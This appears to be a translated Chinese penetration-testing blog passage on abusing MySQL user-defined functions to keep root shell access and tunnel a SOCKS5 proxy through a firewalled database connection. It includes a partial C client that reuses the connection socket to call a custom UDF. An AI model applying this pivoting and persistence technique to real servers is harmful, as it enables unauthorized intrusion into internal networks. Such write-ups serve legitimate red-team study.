    在进行红队渗透测试时我更喜欢用不容易被发现的MySQL UDF来维持shell权限。最近我们遇到了一种特殊的情况：防火墙只允许对数据库的访问，阻止了对机器的其他访问。在这种有防火墙的情况下，无法通过传统的UDF来反弹出shell，但可以尝试do_system之类的函数来执行命令。
    那么我们是否可以用同一个客户端来监听shell？或者把MySQL服务作为代理，将流量转发出来，从而让我们攻击内网的其他机器呢？如果防火墙只允许MySQL服务，那我们就通过它来攻击整个内网。
 
UDF和MySQL
    UDF（用户自定义函数）可以用来拓展MySQL的功能，而这些函数都会由MySQL中的一个共享对象来加载，也就是说可以通过UDF以root权限来执行命令，所以采用下面的代码作为框架来构造我们的UDF函数。

尝试搭建代理
    像我们之前说的一样，我们的目标是通过UDF来通过客户端的连接，实现所有TCP流量的转发。也就是说如果我们能知道文件的文件描述符，就能轻松实现这一目标，然而问题在于我们无法直接获得目前连接所用的文件描述符，所以我们得尝试爆破获取（当然这是一个很老的技巧了）。
    首先我们需要知道文件描述符的范围才能进行爆破，所以我们来尝试打开一个新的socket并保存返回的文件描述符，这个数字也就是我们的最大值。

连接到MySQL服务
    最简单的创建通信的方法就是使用MySQL C API接口，我们采用下面的代码案例来创建与服务器的连接，然后使用打开的socket来执行我们的语句并开始交互：
void proxy_init(int sock){
    ...
    write(sock, "\31\x00\x00\00\x03select do_carracha('a');", 30); // 执行问询 "select do_carracha('a')"
    ...
}

int main (int argc, char **argv) {
    MYSQL *con = mysql_init(NULL);

    if (con == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        exit(1);
    }
    if (mysql_real_connect(con, "Y.Y.Y.Y", "username", "password", NULL, 0, NULL, 0) == NULL) {
        fprintf(stderr, "%s\n", mysql_error(con));
        mysql_close(con);
        exit(1);
    }

    proxy_init(3); // 3 is the socket (0 -> stdin, 1 -> stdout, 2 -> stderr)
    exit(0);
}
    我们的客户端先在本地打开端口，然后将代理的信息通过MySQL转发出来，所以我们接受和发送的所有信息都会传到服务器上。
    如果这时候我们有一个MySQL交互的客户端，又有一个UDF来重用客户端的socket发送和接受信息，那么我们只差利用UDF来搭建SOCKS5的流量了。
